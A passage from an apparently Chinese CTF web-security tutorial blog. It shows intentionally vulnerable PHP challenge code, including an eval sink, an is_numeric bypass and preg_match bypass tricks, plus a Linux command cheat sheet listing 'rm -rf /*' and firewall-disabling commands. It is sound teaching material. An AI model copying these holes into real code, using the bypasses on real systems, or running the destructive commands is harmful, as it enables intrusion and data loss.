title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;The time must be number.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;This time is too short.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;This time is too long.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]); </span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">        &#125; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><blockquote><p>int()，不能正确转换的类型有十六进制型字符串、科学计数法型字符串<br>is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串</p></blockquote><p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt; time &lt; 7776000</p><p>通过is_number() 能传入科学计数法，来进行绕过。</p><p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p><h3 id="php-eval-RCE"><a href="#php-eval-RCE" class="headerlink" title="php_eval_RCE"></a>php_eval_RCE</h3><p>eval危险函数利用好就可以完成RCE，所以一般使用的时候会ban掉很多东西,下面就是一个最简单的<code>eval()</code>的利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以通过调用一些函数达到RCE的效果，最经典的就是<code>system()</code>可以通过这个函数实现命令的执行。</p><h4 id="然后就是一些linux的基础知识"><a href="#然后就是一些linux的基础知识" class="headerlink" title="然后就是一些linux的基础知识"></a>然后就是一些linux的基础知识</h4><h5 id="Linux系统的文件结构"><a href="#Linux系统的文件结构" class="headerlink" title="Linux系统的文件结构"></a>Linux系统的文件结构</h5><blockquote><p>&#x2F;bin 二进制文件，系统常规命令<br>&#x2F;boot 系统启动分区，系统启动时读取的文件<br>&#x2F;dev 设备文件<br>&#x2F;etc 大多数配置文件<br>&#x2F;home 普通用户的家目录<br>&#x2F;lib 32位函数库<br>&#x2F;lib64 64位库<br>&#x2F;media 手动临时挂载点<br>&#x2F;mnt 手动临时挂载点<br>&#x2F;opt 第三方软件安装位置<br>&#x2F;proc 进程信息及硬件信息<br>&#x2F;root 临时设备的默认挂载点<br>&#x2F;sbin 系统管理命令<br>&#x2F;srv 数据<br>&#x2F;var 数据<br>&#x2F;sys 内核相关信息<br>&#x2F;tmp 临时文件<br>&#x2F;usr 用户相关设定</p></blockquote><h5 id="linux的命令"><a href="#linux的命令" class="headerlink" title="linux的命令"></a>linux的命令</h5><p>立刻关机</p><ul><li><code>shutdown -h now</code></li><li><code>poweroff</code></li></ul><p>两分钟后关机</p><ul><li><code>shutdown -h 2</code></li></ul><p>立刻重启</p><ul><li><code>shutdown -r now</code></li><li><code>reboot</code></li></ul><p>两分钟后重启</p><ul><li><code>shutdown -r 2</code></li></ul><p>帮助命令</p><ul><li><code>（help）ifconfig --help //查看 ifconfig 命令的用法</code></li></ul><p>命令说明书</p><ul><li><code>（man）man shutdown //打开命令说明后，可按&quot;q&quot;键退出</code></li></ul><p>切换用户（su）</p><ul><li><code>su yao //切换为用户&quot;yao&quot;,输入后回车需要输入该用户的密码</code></li><li><code>exit //退出当前用户</code></li></ul><p>切换目录（cd）</p><ul><li><code>cd / //切换到根目录</code></li><li><code>cd /bin //切换到根目录下的bin目录</code></li><li><code>cd ../ //切换到上一级目录 或者使用命令：cd ..</code></li><li><code>cd ~ //切换到home目录</code></li><li><code>cd - //切换到上次访问的目录</code></li><li><code>cd xx(文件夹名) //切换到本目录下的名为xx的文件目录，如果目录不存在报错</code></li><li><code>cd /xxx/xx/x //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</code></li></ul><p>查看目录（ls）</p><ul><li><code>ls //查看当前目录下的所有目录和文件</code></li><li><code>ls -a //查看当前目录下的所有目录和文件（包括隐藏的文件）</code></li><li><code>ls -l //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</code></li><li><code>ls /bin //查看指定目录下的所有目录和文件</code></li></ul><p>创建目录（mkdir）</p><ul><li><code>mkdir tools //在当前目录下创建一个名为tools的目录</code></li><li><code>mkdir /bin/tools //在指定目录下创建一个名为tools的目录</code></li></ul><p>删除目录与文件（rm）</p><ul><li><code>rm 文件名 //删除当前目录下的文件</code></li><li><code>rm -f 文件名 //删除当前目录的的文件（不询问）</code></li><li><code>rm -r 文件夹名 //递归删除当前目录下此名的目录</code></li><li><code>rm -rf 文件夹名 //递归删除当前目录下此名的目录（不询问）</code></li><li><code>rm -rf * //将当前目录下的所有目录和文件全部删除</code></li><li><code>rm -rf /* //将根目录下的所有文件全部删除</code></li></ul><p>修改目录（mv）</p><ul><li><code>mv 当前目录名 新目录名 //修改目录名，同样适用与文件操作</code></li><li><code>mv /usr/tmp/tool /opt //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</code></li><li><code>mv -r /usr/tmp/tool /opt //递归剪切目录中所有文件和文件夹</code></li></ul><p>拷贝目录（cp）</p><ul><li><code>cp /usr/tmp/tool /opt //将/usr/tmp目录下的tool目录复制到 /opt目录下面</code></li><li><code>cp -r /usr/tmp/tool /opt //递归剪复制目录中所有文件和文件夹</code></li></ul><p>搜索目录（find）</p><ul><li><code>find /bin -name &#39;a*&#39; //查找/bin目录下的所有以a开头的文件或者目录</code></li></ul><p>查看当前目录（pwd）</p><ul><li><code>pwd //显示当前位置路径</code></li></ul><p>新增文件（touch）</p><ul><li><code>touch a.txt //在当前目录下创建名为a的txt文件（文件不存在），如果文件存在，将文件时间属性修改为当前系统时间</code></li></ul><p>删除文件（rm）</p><ul><li><code>rm 文件名 //删除当前目录下的文件</code></li><li><code>rm -f 文件名 //删除当前目录的的文件（不询问）</code></li></ul><p>编辑文件（vi、vim）</p><ul><li><code>vi 文件名 //打开需要编辑的文件</code></li><li><code>vim +10 filename.txt //打开文件并跳到第10行</code></li><li><code>vim -R /etc/passwd //以只读模式打开文件</code></li></ul><blockquote><p>-进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）<br>命令模式<br>-刚进入文件就是命令模式，通过方向键控制光标位置，<br>-使用命令”dd”删除当前整行<br>-使用命令”&#x2F;字段”进行查找<br>-按”i”在光标所在字符前开始插入<br>-按”a”在光标所在字符后开始插入<br>-按”o”在光标所在行的下面另起一新行插入<br>-按”：”进入底行模式<br>插入模式<br>-此时可以对文件内容进行编辑，左下角会显示 “– 插入 –””<br>-按”ESC”进入底行模式<br>底行模式<br>-退出编辑： :q<br>-强制退出： :q!<br>-保存并退出： :wq</p><p>操作步骤示例</p><p>1.保存文件：按”ESC” -&gt; 输入”:” -&gt; 输入”wq”,回车 &#x2F;&#x2F;保存并退出编辑<br>2.取消操作：按”ESC” -&gt; 输入”:” -&gt; 输入”q!”,回车 &#x2F;&#x2F;撤销本次修改并退出编辑</p></blockquote><p>查看文件</p><ul><li><code>cat a.txt //查看文件最后一屏内容</code></li><li><code>less a.txt //PgUp向上翻页，PgDn向下翻页，&quot;q&quot;退出查看</code></li><li><code>more a.txt //显示百分比，回车查看下一行，空格查看下一页，&quot;q&quot;退出查看</code></li><li><code>tail -100 a.txt //查看文件的后100行，&quot;Ctrl+C&quot;退出查看</code></li></ul><p>权限说明</p><blockquote><p>文件权限简介：’r’ 代表可读（4），’w’ 代表可写（2），’x’ 代表执行权限（1），括号内代表”8421法”<br>##文件权限信息示例：-rwxrw-r–<br>-第一位：’-‘就代表是文件，’d’代表是文件夹<br>-第一组三位：拥有者的权限<br>-第二组三位：拥有者所在的组，组员的权限<br>-第三组三位：代表的是其他用户的权限</p></blockquote><p>文件权限</p><ul><li><code>普通授权 chmod +x a.txt</code></li><li><code>8421法 chmod 777 a.txt //1+2+4=7，&quot;7&quot;说明授予所有权限</code></li></ul><p>打包与解压</p><blockquote><p>.zip、.rar &#x2F;&#x2F;windows系统中压缩文件的扩展名</p><p>.tar &#x2F;&#x2F;Linux中打包文件的扩展名</p><p>.gz &#x2F;&#x2F;Linux中压缩文件的扩展名</p><p>.tar.gz &#x2F;&#x2F;Linux中打包并压缩文件的扩展名</p></blockquote><p>打包文件</p><blockquote><p>tar -zcvf 打包压缩后的文件名 要打包的文件<br>参数说明：z：调用gzip压缩命令进行压缩; c：打包文件; v：显示运行过程; f：指定文件名;</p></blockquote><ul><li><code>tar -zcvf a.tar file1 file2,... //多个文件压缩打包</code></li></ul><p>解压文件</p><ul><li><code>tar -zxvf a.tar //解包至当前目录</code></li><li><code>tar -zxvf a.tar -C /usr------ //指定解压的位置</code></li><li><code>unzip test.zip //解压*.zip文件</code></li><li><code>unzip -l test.zip //查看*.zip文件的内容</code></li></ul><p>其他常用命令<br>find</p><ul><li><code>find . -name &quot;*.c&quot; //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</code></li><li><code>find . -type f //将目前目录其其下子目录中所有一般文件列出</code></li><li><code>find . -ctime -20 //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</code></li><li><code>find /var/log -type f -mtime +7 -ok rm &#123;&#125; \; //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</code></li><li><code>find . -type f -perm 644 -exec ls -l &#123;&#125; \; //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</code></li><li><code>find / -type f -size 0 -exec ls -l &#123;&#125; \; //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</code></li></ul><p>whereis</p><ul><li><code>whereis ls //将和ls文件相关的文件都查找出来</code></li></ul><p>which</p><blockquote><p>说明：which指令会在环境变量$PATH设置的目录里查找符合条件的文件。</p></blockquote><ul><li><code>which bash //查看指令&quot;bash&quot;的绝对路径</code></li></ul><p>sudo</p><blockquote><p>说明：sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。需要输入自己账户密码。<br>使用权限：在 &#x2F;etc&#x2F;sudoers 中有出现的使用者</p></blockquote><ul><li><code>sudo -l //列出目前的权限</code></li><li><code>$ sudo -u yao vi ~www/index.html //以 yao 用户身份编辑 home 目录下www目录中的 index.html 文件</code></li></ul><p>grep</p><ul><li><code>grep -i &quot;the&quot; demo_file //在文件中查找字符串(不区分大小写)</code></li><li><code>grep -A 3 -i &quot;example&quot; demo_text //输出成功匹配的行，以及该行之后的三行</code></li><li><code>grep -r &quot;ramesh&quot; * //在一个文件夹中递归查询包含指定字符串的文件</code></li></ul><p>service</p><blockquote><p>说明：service命令用于运行System V init脚本，这些脚本一般位于&#x2F;etc&#x2F;init.d文件下，这个命令可以直接运行这个文件夹里面的脚本，而不用加上路径</p></blockquote><ul><li><code>service ssh status //查看服务状态</code></li><li><code>service --status-all //查看所有服务状态</code></li><li><code>service ssh restart //重启服务</code></li></ul><p>free</p><blockquote><p>说明：这个命令用于显示系统当前内存的使用情况，包括已用内存、可用内存和交换内存的情况</p></blockquote><ul><li><code>free -g //以G为单位输出内存的使用量，-g为GB，-m为MB，-k为KB，-b为字节</code></li><li><code>free -t //查看所有内存的汇总</code></li></ul><p>top</p><ul><li><code>top //显示当前系统中占用资源最多的一些进程, shift+m 按照内存大小查看</code></li></ul><p>df</p><blockquote><p>说明：显示文件系统的磁盘使用情况</p></blockquote><ul><li><code>df -h //一种易看的显示</code></li></ul><p>mount</p><ul><li><code>mount /dev/sdb1 /u01 //挂载一个文件系统，需要先创建一个目录，然后将这个文件系统挂载到这个目录上</code></li><li><code>mount dev/sdb1 /u01 ext2 defaults 0 2 //添加到fstab中进行自动挂载，这样任何时候系统重启的时候，文件系统都会被加载</code></li></ul><p>uname</p><blockquote><p>说明：uname可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</p></blockquote><ul><li><code>uname -a</code></li></ul><p>yum</p><blockquote><p>说明：安装插件命令</p></blockquote><ul><li><code>yum install httpd //使用yum安装apache</code></li><li><code>yum update httpd //更新apache</code></li><li><code>yum remove httpd //卸载/删除apache</code></li></ul><p>rpm</p><blockquote><p>说明：插件安装命令</p></blockquote><ul><li><code>rpm -ivh httpd-2.2.3-22.0.1.el5.i386.rpm //使用rpm文件安装apache</code></li><li><code>rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm //使用rpm更新apache</code></li><li><code>rpm -ev httpd //卸载/删除apache</code></li></ul><p>date</p><ul><li><code>date -s &quot;01/31/2010 23:59:53&quot; ///设置系统时间</code></li></ul><p>wget</p><blockquote><p>说明：使用wget从网上下载软件、音乐、视频<br>示例：wget <a target="_blank" rel="noopener" href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a><br>&#x2F;&#x2F;下载文件并以指定的文件名保存文件</p></blockquote><ul><li><code>wget -O Lazy_fish.tar.gz http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</code></li></ul><p>ftp</p><ul><li><code>ftp IP/hostname //访问ftp服务器</code></li><li><code>mls *.html - //显示远程主机上文件列表</code></li></ul><p>scp</p><ul><li><code>scp /opt/data.txt 192.168.1.101:/opt/ //将本地opt目录下的data文件发送到192.168.1.101服务器的opt目录下</code></li></ul><p>防火墙操作</p><ul><li><code>service iptables status //查看iptables服务的状态</code></li><li><code>service iptables start //开启iptables服务</code></li><li><code>service iptables stop //停止iptables服务</code></li><li><code>service iptables restart //重启iptables服务</code></li><li><code>chkconfig iptables off //关闭iptables服务的开机自启动</code></li><li><code>chkconfig iptables on //开启iptables服务的开机自启动</code></li></ul><p>centos7 防火墙操作</p><ul><li><code>systemctl status firewalld.service //查看防火墙状态</code></li><li><code>systemctl stop firewalld.service //关闭运行的防火墙</code></li><li><code>systemctl disable firewalld.service //永久禁止防火墙服务</code></li></ul><p>修改主机名（CentOS 7）</p><ul><li><code>hostnamectl set-hostname 主机名</code></li></ul><p>查看网络</p><ul><li><code>ifconfig</code></li></ul><p>修改IP</p><p>修改网络配置文件，文件地址：&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p><p>主要修改以下配置：</p><blockquote><p>TYPE&#x3D;Ethernet &#x2F;&#x2F;网络类型</p><p>BOOTPROTO&#x3D;static &#x2F;&#x2F;静态IP</p><p>DEVICE&#x3D;ens00 &#x2F;&#x2F;网卡名</p><p>IPADDR&#x3D;192.168.1.100 &#x2F;&#x2F;设置的IP</p><p>NETMASK&#x3D;255.255.255.0 &#x2F;&#x2F;子网掩码</p><p>GATEWAY&#x3D;192.168.1.1 &#x2F;&#x2F;网关</p><p>DNS1&#x3D;192.168.1.1 &#x2F;&#x2F;DNS</p><p>DNS2&#x3D;8.8.8.8 &#x2F;&#x2F;备用DNS</p><p>ONBOOT&#x3D;yes &#x2F;&#x2F;系统启动时启动此设置</p></blockquote><p>修改保存以后使用命令重启网卡：<code>service network restart</code></p><p>配置映射<br>修改文件： <code>vi /etc/hosts</code><br>在文件最后添加映射地址，示例如下：</p><blockquote><p>192.168.1.101 node1<br>192.168.1.102 node2<br>192.168.1.103 node3</p></blockquote><p>配置好以后保存退出，输入命令：<code>ping node1</code> ，可见实际 ping 的是 192.168.1.101。</p><p>查看进程</p><ul><li><code>ps -ef //查看所有正在运行的进程</code></li></ul><p>结束进程</p><ul><li><code>kill pid //杀死该pid的进程</code></li><li><code>kill -9 pid //强制杀死该进程</code></li></ul><p>查看链接</p><ul><li><code>ping IP //查看与此IP地址的连接情况</code></li><li><code>netstat -an //查看当前系统端口</code></li><li><code>netstat -an | grep 8080 //查看指定端口</code></li></ul><p>快速清屏</p><ul><li><code>ctrl+l //清屏，往上翻可以查看历史操作</code></li></ul><p>远程主机</p><ul><li><code>ssh IP //远程主机，需要输入用户名和密码</code></li></ul><h4 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h4><p>无字母RCE虽然在现实环境中不会出现，但是在CTF中也是常见的考点，最简单的如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>我在冲浪的时候不小心找到了一个佬写的文章，他开发的一个工具，挺有用的。</p><p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/443">针对常规无字母RCE的通用辅助脚本开发</a></p><h3 id="php的一些特性"><a href="#php的一些特性" class="headerlink" title="php的一些特性"></a>php的一些特性</h3><h4 id="你喜欢preg-match吗？"><a href="#你喜欢preg-match吗？" class="headerlink" title="你喜欢preg_match吗？"></a>你喜欢preg_match吗？</h4><p>首先是大家喜闻乐见的<code>%0a</code>，什么？你也喜欢，他的原理是什么呢？</p><p>我们随便写个php测一下，<code>$</code>似乎会忽略在句尾的<code>%0a</code>，无论是换行模式还是不换行？</p><p>测了一下，这似乎是个错误的理解（）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;1&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/m&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/s&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;3&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/1.png" title="wuhu"><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/2.png" title="wuhu"><p>我们可以看到，<code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，也就是说有<code>m</code>必须要有<code>^</code>或者<code>$</code>，否则无意义。</p><p>还有一个东西，也是<code>%0a</code>所导致的一个小问题,那就是非<code>s</code>模式下<code>.</code>不匹配<code>%0a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag./&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;1&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag.$/m&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag./s&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;3&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/3.png" title="wuhu"><p>众所周知，preg_match()函数是可以绕过的，详细参考p神<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>正好测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$code</span>=<span class="string">&quot;hello&quot;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>,<span class="number">1000000</span>).<span class="string">&quot;hello_CTF&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?CTF/is&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;o.0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;hello_CTF&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;0.o&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/4.png" title="wuhu"><h4 id="讨厌的intval"><a href="#讨厌的intval" class="headerlink" title="讨厌的intval"></a>讨厌的intval</h4><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/5.png" title="wuhu"><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><blockquote><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p></blockquote><ol><li>常见的魔术方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h4 id="一般类型"><a href="#一般类型" class="headerlink" title="一般类型"></a>一般类型</h4><p>示例题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MRCTF2020-Ezpop</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 